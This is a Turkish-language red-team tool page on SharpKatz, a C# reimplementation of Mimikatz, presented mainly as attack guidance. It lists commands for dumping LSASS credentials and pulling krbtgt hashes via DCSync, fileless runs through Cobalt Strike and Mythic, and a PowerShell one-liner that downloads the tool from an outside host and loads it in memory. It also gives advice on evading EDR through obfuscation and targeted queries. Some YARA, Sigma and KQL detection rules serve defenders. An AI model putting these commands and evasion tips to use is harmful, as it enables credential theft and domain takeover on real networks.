# SharpKatz

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Marcellus (@b4rtik) tarafından geliştirilen; Mimikatz'ın `sekurlsa` (yerel bellek analizi) ve `lsadump` (uzaktan DCSync replikasyonu) modüllerini hiçbir üçüncü taraf C/C++ ikilisi veya gömülü PE yükleyiciye ihtiyaç duymadan, sıfırdan ve tamamen yerel C# (.NET) kodu ile yeniden uygulayan gelişmiş post-exploitation aracı.

---

## 1. Genel Bakış ve Amaç

Mimikatz uzun yıllardır bellek analizi ve kimlik hırsızlığında endüstri standardı olsa da, derlenmiş yerel ikilisi (`mimikatz.exe`) ve içerisindeki karakteristik kod blokları modern antivirüs ve EDR yazılımları tarafından çok katı statik ve dinamik imzalarla engellenmektedir. `SafetyKatz` gibi araçlar Mimikatz'ı XOR ile şifrelenmiş bir bayt dizisi olarak C# içine gömüp bellek içi PE yükleyici (PELoader) ile çalıştırmayı denese de, bellek içi bellek tarayıcıları (Memory Scanners) PE başlıklarını (`MZ` / `PE`) ve şifresi çözülen Mimikatz dizgilerini tespit edebilmektedir.

**`SharpKatz`**, bu soruna radikal bir mimari çözüm getirir: **Mimikatz'ı sarmalamak yerine, Mimikatz'ın tüm iç algoritmalarını doğrudan saf C# (.NET) ile yeniden yazmıştır.** Araç:
1. **Saf C# `sekurlsa` Motoru:** Windows Win32 API'lerini P/Invoke ile çağırarak `lsass.exe` sanal bellek alanını (`ReadProcessMemory`) okur. `msv1_0`, `kerberos`, `wdigest`, `tspkg` ve `credman` güvenlik paketlerinin bellek içi `LogonSessionList` yapılarını yerel C# sınıfları ile haritalar; 3DES ve AES şifre çözme algoritmalarını doğrudan .NET kütüphaneleriyle işleterek parolaları, NTLM hash'lerini ve Kerberos anahtarlarını çıkarır.
2. **Saf C# `lsadump::dcsync` Motoru:** Microsoft Dizin Çoğaltma Servisi Uzak Protokolü'nü (MS-DRSR / DRSUAPI) yöneten yerel bir RPC istemcisini C# ile uygular. Hedef sistemde hiçbir koda veya LSASS erişimine ihtiyaç duymadan, doğrudan etki alanı denetleyicisi ile replikasyon başlatarak `krbtgt` dahil tüm kullanıcıların parola karmalarını çeker.
3. **Sıfır Gömülü İkili (No Embedded PE):** Kod içerisinde hiçbir PE başlığı, DLL kütüphanesi veya yabancı derlenmiş ikili yer almaz; tamamen meşru bir .NET Assembly görüntüsüne sahiptir.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│             SALDIRGAN / C2 BEACON (execute-assembly)                   │
│                                                                        │
│  [ SharpKatz.exe (Saf C# / .NET Yönetilen Kod) ]                       │
│         │                                                              │
│         ├── [ MOD 1: YEREL BELLEK ANALİZİ (--Command logonpasswords) ] │
│         │     │                                                        │
│         │     ├── OpenProcess(PROCESS_VM_READ, lsass.exe)              │
│         │     ├── C# LSA Parser: LogonSessionList Bellek Taraması      │
│         │     ├── .NET Kripto Motoru (Yerel AES / 3DES Deşifreleme)   │
│         │     └── Çıktı: NTLM Hash, WDigest, Kerberos Anahtarları      │
│         │                                                              │
│         └── [ MOD 2: AĞ TABANLI DCSYNC (--Command dcsync) ]           │
│               │                                                        │
│               ├── Saf C# MS-DRSR RPC İstemcisi Başlatılır               │
│               ├── Domain Controller (TCP 135 / RPC Dinamik Port)       │
│               ├── DsGetNCChanges Replikasyon Talebi Gönderilir         │
│               └── Dönen DRS_MSG_GETCHGREPLY Paketinden Hash Çekilir    │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 Saf C# LSA Bellek Çözümleme Mimarisi

SharpKatz, C# yönetilen kod dünyasından Windows işletim sisteminin çekirdek bellek alanlarını okumak için şu P/Invoke Win32 API fonksiyonlarını kullanır:
- `OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, lsassPid)`
- `ReadProcessMemory(hProcess, baseAddress, buffer, size, out bytesRead)`

Belleğe eriştikten sonra araç şu adımları izler:
1. **İmza Kalıbı Taraması (Pattern Scanning):** Farklı Windows sürümlerine (Windows 10, Server 2016, 2019, 2022) özgü bayt kalıplarını kullanarak `lsasrv.dll` içerisindeki `LogonSessionList` ve `LogonSessionListCount` genel değişkenlerinin bellek adreslerini dinamik olarak saptar.
2. **Yapı Haritalama:** Bulunan adresler üzerinden C# içerisinde tanımlanan `_KIWI_MSV1_0_PRIMARY_CREDENTIALS` ve `_KIWI_KERBEROS_LOGON_SESSION_LIST` yapıları tek tek çözümlenir.
3. **Deşifreleme:** LSA'nın şifreleme anahtarları (3DES / AES Initialization Vector ve Key) bellekten çıkarılarak `System.Security.Cryptography` kütüphanesiyle şifreli parola blokları anında çözülür.

### 1.2 DRSUAPI RPC Replikasyon Protokolü ve Saf C# İstemcisi

`SharpKatz`'ın en güçlü yanlarından biri, uzaktan DCSync yapabilmek için Impacket veya Mimikatz gibi araçlara ihtiyaç duymamasıdır:
- Windows RPC arabirimini (UUID: `e3514235-4b06-11d1-ab04-00c04fc2dcd2`) doğrudan C# soket ve RPC sarmalayıcılarıyla bağlar (`RpcBindingFromStringBinding`).
- `IDL_DRSBind` çağrısıyla oturum açar, ardından `IDL_DRSGetNCChanges` çağrısı yaparak hedef kullanıcının (`krbtgt` vb.) etki alanı nesne özniteliklerini talep eder.
- Dönen paketteki `unicodePwd` veya `dBCSPwd` özniteliklerini, etki alanının oturum anahtarıyla (Session Key) deşifre ederek NTLM hash'ini konsola basar.

---

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Saf .NET Mimarisi** | Gömülü Mimikatz PE ikilisi veya yabancı kabuk kodu (shellcode) barındırmaz. | PE başlığı arayan gelişmiş bellek içi EDR tarayıcılarını tamamen baypas eder. |
| **DCSync Yeteneği** | LSASS sürecine dokunmadan uzaktan ağ üzerinden replikasyon yapabilir. | Uç noktada LSASS erişim logu (Sysmon 10) oluşturmadan etki alanı hash'lerini toplar. |
| **Tam `execute-assembly` Uyumu** | Bağımsız çalışabilen C# assembly formatındadır. | Cobalt Strike, Covenant, Havoc gibi modern C2 araçlarında diske basılmadan çalıştırılır. |
| **Kerberos Anahtar Dökümü** | Yalnızca NTLM değil; Kerberos AES128/AES256 şifreleme anahtarlarını (`ekeys`) çıkarır. | Overpass-the-Hash ve modern Kerberos saldırılarına doğrudan girdi sağlar. |

### Karşılaştırma Tablosu

| Kriter | SharpKatz | SafetyKatz | Mimikatz (Resmi) | pypykatz |
|---|---|---|---|---|
| **Kod Tabanı** | Saf C# (.NET) | C# + Gömülü C PE | Yerel C / Win32 | Python |
| **Gömülü Mimikatz İkilisi** | **YOK** (Yeniden yazım) | VAR (XOR Şifreli) | Aracın Kendisi | YOK (Python Portu) |
| **DCSync Desteği** | VAR (C# RPC Motoru) | YOK | VAR | YOK |
| **Bellek Dökümü Zorunluluğu**| Hayır (Canlı okur) | Evet (`MiniDumpWriteDump`) | Hayır | Evet (Çevrimdışı dmp) |
| **Statik İmza Riski** | Çok Düşük | Orta | Çok Yüksek | Sıfır |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
SharpKatz.exe --Command <komut> [seçenekler]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `--Command` | Çalıştırılacak modül/yetenek (`logonpasswords`, `dcsync`, `ekeys`). | `--Command logonpasswords` |
| `--Domain` | DCSync için hedef Active Directory etki alanı adı (FQDN). | `--Domain corp.local` |
| `--DomainController` | DCSync RPC çağrısının yapılacağı etki alanı denetleyicisi IP/Adı. | `--DomainController dc01.corp.local` |
| `--User` | DCSync ile parola hash'i çekilecek hedef kullanıcı adı. | `--User krbtgt` veya `--User Administrator` |
| `--Altservice` | Kerberos biletleri için alternatif servis adı sorgulama. | `--Altservice krbtgt/corp.local` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Yerel LSASS Sürecinden Canlı Kimlik Dökümü

Yerel yönetici haklarına sahip bir oturumda doğrudan C# bellek çözümleme motoru çalıştırılır ve aktif oturumların NTLM hash'leri çekilir.

```cmd
SharpKatz.exe --Command logonpasswords
```

**Konsol Çıktısı Analizi:**

```text
[*] SharpKatz by @b4rtik
[*] Elevating to SeDebugPrivilege... OK
[*] Opening LSASS process... Handle: 0x00000184
[*] Reading LSA memory structures via pure .NET...

[+] Authentication Id: 0;294829 (00000000:00047fa5)
    Session: Interactive
    User Name: Administrator
    Domain: CORP
    Logon Server: DC01
    SID: S-1-5-21-2559786414-2279769532-2164155192-500
    [+] msv1_0:
        NTLM: 01fc5a6be7bc6929c40372d23f5052b3
        SHA1: 4b5a6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b
    [+] wdigest:
        Password: (null)
    [+] kerberos:
        Username: Administrator
        Domain: CORP.LOCAL

[*] Finished successfully.
```

---

### Senaryo 2: Uzaktan C# DCSync Saldırısı ile KRBTGT Hash'ini Çekme

Hedef uç noktada LSASS sürecine hiçbir şekilde dokunulmadan, ağ üzerinden etki alanı denetleyicisine MS-DRSR replikasyon çağrısı yapılarak `krbtgt` hesabı sorgulanır.

```cmd
SharpKatz.exe --Command dcsync --Domain corp.local --DomainController 192.168.1.10 --User krbtgt
```

**Konsol Çıktısı Analizi:**

```text
[*] SharpKatz DCSync Module
[*] Binding to RPC interface drsuapi on 192.168.1.10... OK
[*] Replicating user: krbtgt

Object RDN: krbtgt
SAM Account Name: krbtgt
User Account Control: 0x00000202
Current RID: 502

Hash NTLM: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
aes256_cts_hmac_sha1: 1673a9f0e1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8
aes128_cts_hmac_sha1: c20f18c6d48259a8c089b7e6f5a4b3c2
```

---

### Senaryo 3: Kerberos Şifreleme Anahtarlarını (Ekeys) Listeleme

Aktif oturumlara ait AES-256, AES-128 ve DES/RC4 anahtarlarını dökerek Overpass-the-Hash saldırılarına hazırlık yapılır.

```cmd
SharpKatz.exe --Command ekeys
```

---

### Senaryo 4: Cobalt Strike `execute-assembly` ile Dosyasız İcra

Saldırgan, Beacon oturumu üzerinden SharpKatz'ı diske basmadan doğrudan bellek içinde yürütür.

```text
beacon> execute-assembly /opt/SharpKatz/SharpKatz.exe --Command logonpasswords
```

---

### Senaryo 5: Tekil Domain Admin Kullanıcısı İçin Hedefli DCSync

Tüm veritabanı yerine yalnızca kritik bir etki alanı yöneticisinin hash'ini çekerek ağ gürültüsü minimum seviyede tutulur.

```cmd
SharpKatz.exe --Command dcsync --Domain corp.local --User DA_JohnDoe
```

---

### Senaryo 6: Overpass-the-Hash için AES256 Anahtarı Hasadı

Kerberos AES anahtarını elde ettikten sonra Rubeus ile doğrudan TGT talep etme zinciri:

```cmd
SharpKatz.exe --Command ekeys
:: Çıkan aes256_cts_hmac_sha1 anahtarı ile bilet alma:
:: Rubeus.exe asktgt /user:Administrator /domain:corp.local /aes256:1673a9f0... /ptt
```

---

### Senaryo 7: PowerShell İçinden Add-Type ile Dinamik Derleme

C# kaynak kodunu veya derlenmiş baytları PowerShell üzerinden doğrudan belleğe enjekte etme:

```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\SharpKatz.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]]@('--Command', 'dcsync', '--Domain', 'corp.local', '--User', 'krbtgt')))
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `OpenProcess failed: 5 (Access Denied)` | Süreçte `SeDebugPrivilege` yok veya hedefte `RunAsPPL` (Protected Process Light) devrede. | Komut istemini Elevated açın; PPL devredeyse DCSync moduna (`--Command dcsync`) geçin veya PPLMedic kullanın. |
| `DCSync failed: Access is denied (0x5)` | Mevcut kullanıcı oturumunun etki alanında "Dizin Değişikliklerini Çoğaltma" (Replicating Directory Changes) hakları yok. | Domain Admin veya DCSync yetkilerine sahip bir kullanıcı bağlamına geçiş yapın (Overpass-the-Hash / Impersonation). |
| `Pattern match failed / Signature not found` | Hedef Windows sürümündeki LSA bellek veri yapısı SharpKatz içerisindeki imza kalıplarıyla uyuşmuyor. | Windows sürümünü kontrol edin; aracı en güncel GitHub sürümünden derleyin veya `pypykatz`/`Mimikatz` alternatifine başvurun. |
| `RPC Server Unavailable (0x6ba)` | DCSync sırasında DC'nin Port 135 veya dinamik RPC portları güvenlik duvarı tarafından engelleniyor. | `--DomainController` parametresine doğrudan DC IP adresini verin; ağ rotalarını ve güvenlik duvarı izinlerini denetleyin. |
| `WDigest password null` | Windows 8.1 ve üzeri sistemlerde WDigest varsayılan olarak düz metin parola tutmaz. | Bu bir hata değildir; modern mimari gereğidir. NTLM hash'lerini veya Kerberos anahtarlarını kullanın. |
| `CLR crash / BadImageFormatException` | 32-bit bir süreç içinde 64-bit SharpKatz assembly'si çalıştırılmaya çalışılıyor. | Süreç mimarisini (x64) eşleştirin veya projeyi `AnyCPU` derleme seçeneğiyle derleyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: MODA GÖRE DEĞİŞİR (LOGONPASSWORDS: ORTA / DCSYNC: YÜKSEK)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4662 (DCSync), Event ID 4672 (Admin Logon)
[ Sysmon ]          : Event ID 10 (ProcessAccess -> lsass.exe) [Yalnızca logonpasswords]
[ Bellek Analizi ]  : Saf .NET CLR Yürütmesi, PE Başlığı İmzası YOK
[ Ağ İmzaları ]     : MS-DRSR / DRSUAPI RPC Replikasyon Çağrıları (DCSync)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Sysmon Event ID 10 (Process Access):**
   - `--Command logonpasswords` çalıştırıldığında SharpKatz, `lsass.exe` sürecine `0x1010` (`PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ`) yetkisiyle handle açar. Bu durum Sysmon veya EDR ajanları tarafından kaydedilir.
2. **Windows Security Event ID 4662 (Operation on Directory Service Object):**
   - `--Command dcsync` çalıştırıldığında etki alanı denetleyicisinde meşru olmayan bir makineden `DS-Replication-Get-Changes-All` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) genişletilmiş hakkı kullanılarak olay günlüğü tetiklenir.
3. **.NET CLR Yükleme İmzası:**
   - Standart bir Windows sürecine enjekte edildiğinde `clr.dll` yüklenmesi EDR tarafından izlenebilir.

### 5.2 Ağ ve EDR İmzaları

- **DCSync Ağ Anomalisi:** DC dışındaki bir istemciden etki alanı denetleyicisinin `drsuapi` RPC arabirimine bağlanılması SIEM ve Microsoft Defender for Identity (MDI) sensörleri tarafından anında yakalanır.
- **Bellek Temizliği:** Bellek içi PE başlığı taşımaması sayesinde, `Get-InjectedThread` veya bellek içi PE tarayıcıları (Pe-sieve, Moneta) SharpKatz'ı standart Mimikatz gibi tespit edemez.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | `--Command logonpasswords` ile bellekten hash çıkarma. |
| **T1003.006** | OS Credential Dumping: DCSync | `--Command dcsync` ile uzaktan etki alanı veritabanını çoğaltma. |
| **T1558** | Steal or Forge Kerberos Tickets | `--Command ekeys` ile Kerberos şifreleme anahtarlarını elde etme. |
| **T1059.001** | Command and Scripting Interpreter: PowerShell | .NET yansıtmasıyla dosyasız çalıştırılabilme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **LSASS Handle Açma Riski** | Uç noktada agresif EDR varsa yerel `--Command logonpasswords` yerine, hedef makinede hiç kod çalıştırmadan uzaktan `--Command dcsync` modunu tercih edin. |
| **Toplu DCSync Alarmları** | Tüm kullanıcıları sırayla sorgulamayın; yalnızca operasyonel gereksinim olan `krbtgt` veya tekil yönetici hesabını sorgulayın. |
| **İkili Obfuscation** | Hazır GitHub derlemesini kullanmayın; kaynak kodundaki sınıf, metot ve namespace isimlerini ConfuserEx veya benzeri bir C# obfuscator ile karıştırarak derleyin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — SharpKatz .NET Assembly İmzası Tespiti:**

```yara
rule Suspicious_SharpKatz_Managed_Assembly {
    meta:
        description = "Detects SharpKatz pure C# implementation of sekurlsa and dcsync"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "SharpKatz" ascii wide nocase
        $s2 = "logonpasswords" ascii wide
        $s3 = "drsuapi" ascii wide
        $s4 = "DsGetNCChanges" ascii wide
        $s5 = "b4rtik" ascii wide
    condition:
        uint16(0) == 0x5A4D and 3 of them
}
```

**Sigma Kuralı — .NET Sürecinin LSASS Belleğini Okuması Tespiti:**

```yaml
title: Suspicious .NET Process Reading LSASS Memory
status: experimental
description: Detects a .NET managed process opening a read handle to lsass.exe indicative of SharpKatz.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess: '0x1010'
  condition: selection
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli İş İstasyonundan DCSync Sorgusu:**

```kql
SecurityEvent
| where EventID == 4662
| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" // Replicating Directory Changes All
| where Computer !has "DC" // Kaynak bilgisayar etki alanı denetleyicisi değilse
| project TimeGenerated, Computer, SubjectUserName, Properties, IpAddress
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Yerel LSASS Parola ve Hash Dökümü
```cmd
SharpKatz.exe --Command logonpasswords
```
- **Ne Yapar?** `SeDebugPrivilege` edinir, LSASS sürecini açar ve saf C# algoritmalarıyla tüm aktif oturumların NTLM hash'lerini döker.
- **Ne Zaman Kullanılır?** Yerel yönetici haklarına sahip olunan bir sistemde hızlı kimlik toplamak için.
- **Parametreler:** `--Command logonpasswords`: Bellek analizi komutu.

### Komut 2: Uzaktan KRBTGT DCSync Çoğaltması
```cmd
SharpKatz.exe --Command dcsync --Domain corp.local --DomainController 192.168.1.10 --User krbtgt
```
- **Ne Yapar?** Yerel LSASS'a dokunmadan doğrudan DC ile DRSR protokolü üzerinden konuşarak `krbtgt` NTLM ve AES anahtarlarını çeker.
- **Ne Zaman Kullanılır?** Golden Ticket saldırısı için gereken kök anahtarları elde etmek amacıyla.
- **Parametreler:** `--Domain`: FQDN adı, `--DomainController`: DC IP adresi, `--User`: Hedef hesap.

### Komut 3: Kerberos Şifreleme Anahtarlarını (Ekeys) Dökme
```cmd
SharpKatz.exe --Command ekeys
```
- **Ne Yapar?** Bellekteki Kerberos AES-128, AES-256 ve RC4 şifreleme anahtarlarını ekrana basar.
- **Ne Zaman Kullanılır?** Overpass-the-Hash veya Pass-the-Key saldırılarında AES anahtarlarını kullanmak için.
- **Parametreler:** `--Command ekeys`: Kerberos anahtar döküm modu.

### Komut 4: Cobalt Strike Beacon Üzerinden Dosyasız Çalıştırma
```text
beacon> execute-assembly SharpKatz.exe --Command logonpasswords
```
- **Ne Yapar?** SharpKatz ikilisini diske yazmadan doğrudan Beacon belleği üzerinden yürütür.
- **Ne Zaman Kullanılır?** C2 operasyonlarında disk tabanlı antivirüs alarmlarını tetiklememek için.
- **Parametreler:** `execute-assembly`: Cobalt Strike .NET bellek yükleme komutu.

### Komut 5: Belirli Bir Etki Alanı Yöneticisini DCSync ile Sorgulama
```cmd
SharpKatz.exe --Command dcsync --Domain corp.local --DomainController dc01.corp.local --User Administrator
```
- **Ne Yapar?** Yalnızca `Administrator` kullanıcısının kimlik bilgilerini DC üzerinden çeker.
- **Ne Zaman Kullanılır?** Geniş veritabanı dökümü yerine hedef odaklı tekil kimlik hasadı için.
- **Parametreler:** `--User Administrator`: Hedef yönetici hesabı.

### Komut 6: PowerShell Üzerinden Bellek İçi Yükleme
```powershell
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://10.10.10.5/sk.exe')).EntryPoint.Invoke($null, (, [string[]]@('--Command', 'logonpasswords')))
```
- **Ne Yapar?** Web üzerinden indirilen SharpKatz baytlarını doğrudan RAM'e yükler ve parametreli olarak çağırır.
- **Ne Zaman Kullanılır?** Hedefe ikili dosya indirmeden bellek içi yönetim kabuğu oturumlarında çalıştırmak için.
- **Parametreler:** `[System.Reflection.Assembly]::Load`: .NET yansıtma yükleyicisi.

### Komut 7: Alternatif Servis SPN Sorgusu ile DCSync
```cmd
SharpKatz.exe --Command dcsync --Domain corp.local --User krbtgt --Altservice krbtgt/corp.local
```
- **Ne Yapar?** Servis biletleri ile ilişkili alternatif SPN kaydını hedefleyerek replikasyon verilerini doğrular.
- **Ne Zaman Kullanılır?** Karmaşık çoklu etki alanı (Forest/Trust) ortamlarında SPN tabanlı doğrulama yaparken.
- **Parametreler:** `--Altservice`: Alternatif servis adı.

### Komut 8: Konsol Çıktısını Gizleyerek Dosyaya Yönlendirme
```cmd
SharpKatz.exe --Command logonpasswords > C:\Users\Public\debug.log 2>&1
```
- **Ne Yapar?** Tüm kimlik dökümünü ekrana basmak yerine belirtilen geçici metin dosyasına yazar.
- **Ne Zaman Kullanılır?** Uzaktan kör komut yürütme (Blind Command Execution) senaryolarında çıktı toplamak için.
- **Parametreler:** `> C:\Users\Public\debug.log`: Çıktı yönlendirmesi.

### Komut 9: Mythic C2 Çatısında inline-assembly ile Çalıştırma
```text
mythic> inline_assembly -assembly SharpKatz.exe -args "--Command logonpasswords"
```
- **Ne Yapar?** Mythic ajanı içinde alt süreç başlatmadan doğrudan süreç içi C# icrası yapar.
- **Ne Zaman Kullanılır?** Fork-and-run modellerini izleyen EDR sensörlerini aşmak için.
- **Parametreler:** `inline_assembly`: Süreç içi assembly yükleme.

### Komut 10: Belirli Bir DC IP Adresine Yönlendirilmiş DCSync
```cmd
SharpKatz.exe --Command dcsync --Domain corp.local --DomainController 10.0.0.1 --User krbtgt
```
- **Ne Yapar?** DNS çözümlemesi yapmadan doğrudan belirtilen IP adresindeki etki alanı denetleyicisi ile konuşur.
- **Ne Zaman Kullanılır?** İstemci makinede DNS zehirlemesi veya DNS yapılandırma sorunları olduğunda.
- **Parametreler:** `--DomainController 10.0.0.1`: Sabit IP yönlendirmesi.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [B4rtik / SharpKatz](https://github.com/b4rtik/SharpKatz)
- **B4rtik Blog / Research:** [C# Re-implementation of Mimikatz Features](https://github.com/b4rtik)
- **MITRE ATT&CK Referansı:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **Microsoft Dokümantasyonu:** [MS-DRSR: Directory Replication Service Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/)

---

> **Önceki:** [← SafetyKatz](./SafetyKatz.md) · **Sonraki:** [comsvcs.dll →](./comsvcs.dll.md)
